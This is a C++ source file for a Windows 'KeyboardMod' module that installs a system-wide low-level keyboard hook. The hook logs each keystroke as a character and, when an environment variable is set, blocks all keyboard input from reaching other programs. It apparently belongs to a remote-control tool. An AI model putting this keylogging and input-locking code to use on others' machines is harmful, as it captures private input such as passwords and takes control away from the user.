#include "keyboard.h"

#define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for

HHOOK ghHook;
KBDLLHOOKSTRUCT kbdStruct;

int KeyboardMod::requireAdmin() {
    return 0;
}

void KeyboardMod::start() {

    if(setHook()) {
        return;
    }

    wprintf(L"Hook successfully installed!\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)) {
    }

}

void KeyboardMod::kill() {

    releaseHook();

}

bool setHook() {

    // set the keyboard hook for all processes on the computer
    // runs the hookCallback function when hooked is triggered
    if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());

        return 1;
    }

    return 0;

}

bool releaseHook() {

    return UnhookWindowsHookEx(ghHook);

}

void logKeystroke(int vkCode) {
    // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
    // resolution and logging of the keystrokes is performed here
    // also ignores mouse inputs

    HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());


    // check for CapsLock
    bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);

    // check for Shift keys
    if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) {
        lowercase = !lowercase;
    }

    char key = MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout);
    key = (lowercase) ? tolower(key) : key;

    // print to test functionality, MUST move to another location eventually
    wprintf(L"%c\n", key);
}

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    // function handler for all keyboard strokes


    // YR: I leave this here just in case u don't like this new logic
    // size_t requiredSize;
    // wchar_t *buffer;
    // errno_t errNo = _wgetenv_s(&requiredSize, buffer, 0, KB_ENV);
    // if(errNo || !requiredSize) {
    //     // error handling if _wgetenv_s fails
    //     // OR the required ENV is not set on the system
    //     wprintf(L"%s\n", "[ERROR] Could not find the required environment value, exiting!");

    //     releaseHook();

    //     exit(1);
    // }

    std::wstring buffer = getEnvVar(KB_ENV, L"0");

    long int keyboardLocked = wcstol(buffer.c_str(), NULL, 2);

    if(keyboardLocked) {
        if(nCode >= 0) {
            if(wParam == WM_KEYDOWN) {
                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

                logKeystroke(kbdStruct.vkCode);
            }
        }

        // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
        return 1;
    }

    return CallNextHookEx(ghHook, nCode, wParam, lParam);
}
